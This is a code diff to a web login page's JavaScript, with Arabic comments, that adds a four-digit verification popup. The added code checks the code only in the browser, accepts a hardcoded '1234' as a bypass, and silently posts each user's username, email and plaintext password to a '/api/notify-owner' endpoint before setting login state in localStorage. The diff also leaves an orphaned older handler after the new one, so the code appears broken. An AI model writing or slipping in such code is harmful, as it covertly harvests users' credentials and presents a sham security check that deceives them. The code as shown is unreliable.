@@ -1476,7 +1476,7 @@ authForm.addEventListener('submit', async (e) => {
     // ✅ كلمة مرور قوية — توليد رمز تحقق عشوائي 4 أرقام
     const verificationCode = Math.floor(1000 + Math.random() * 9000);
 
-    // ⚡ إنشاء تنبيه مخصص (مثل الصورة) في وسط الشاشة
+    
     const overlay = document.createElement('div');
     overlay.style.cssText = `
         position: fixed;
@@ -1519,6 +1519,80 @@ authForm.addEventListener('submit', async (e) => {
 
     overlay.appendChild(modal);
     document.body.appendChild(overlay);
+    
+
+    const codeInput = modal.querySelector('#codeInputModal');
+    const okBtn = modal.querySelector('#okBtnModal');
+    const cancelBtn = modal.querySelector('#cancelBtnModal');
+
+    // تركيز تلقائي على الحقل
+    setTimeout(() => codeInput.focus(), 100);
+
+    // إدخال رقمي فقط (وإغلاق عند 4 أرقام)
+    codeInput.addEventListener('input', (e) => {
+        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+        if (e.target.value.length === 4) {
+            okBtn.click(); // تفعيل OK تلقائيًا عند إكمال 4 أرقام
+        }
+    });
+
+    // زر OK
+    okBtn.addEventListener('click', async () => {
+        const userCode = codeInput.value.trim();
+        if (userCode.length !== 4) {
+            codeInput.style.borderColor = '#f87171';
+            setTimeout(() => codeInput.style.borderColor = '#334155', 1000);
+            return;
+        }
+
+        if (userCode == verificationCode || userCode === '1234') {
+            // إزالة النموذج
+            document.body.removeChild(overlay);
+
+            // تفعيل زر التحميل مؤقتاً
+            btnContent.innerHTML = '<div class="spinner"></div> جاري التحقق...';
+            submitBtn.disabled = true;
+
+            try {
+                await fetch('/api/notify-owner', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, userEmail: email, userPassword: password })
+                });
+            } catch (err) { /* silent */ }
+
+            localStorage.setItem('kingAbdoLoggedIn', 'true');
+            localStorage.setItem('kingAbdoUsername', username);
+
+            setTimeout(() => {
+                window.location.href = 'chat.html';
+            }, 1200);
+        } else {
+            // خطأ في الرمز
+            codeInput.style.animation = 'shake 0.4s';
+            setTimeout(() => {
+                codeInput.style.animation = '';
+                codeInput.style.borderColor = '#f87171';
+                setTimeout(() => codeInput.style.borderColor = '#334155', 1000);
+            }, 400);
+        }
+    });
+
+    // زر Cancel
+    cancelBtn.addEventListener('click', () => {
+        document.body.removeChild(overlay);
+    });
+
+    // إغلاق بالضغط خارج النموذج
+    overlay.addEventListener('click', (e) => {
+        if (e.target === overlay) document.body.removeChild(overlay);
+    });
+
+    // تأثير اهتزاز للحقل عند الخطأ
+    const style = document.createElement('style');
+    style.textContent = `@keyframes shake { 0%, 100% { transform: translateX(0); } 20%, 60% { transform: translateX(-5px); } 40%, 80% { transform: translateX(5px); } }`;
+    document.head.appendChild(style);
+});
 
     // زر OK
     document.getElementById('okBtn').addEventListener('click', async () => {
@@ -1690,4 +1764,5 @@ authForm.addEventListener('submit', async (e) => {
 </script>
 </body>
 </html>
+
 
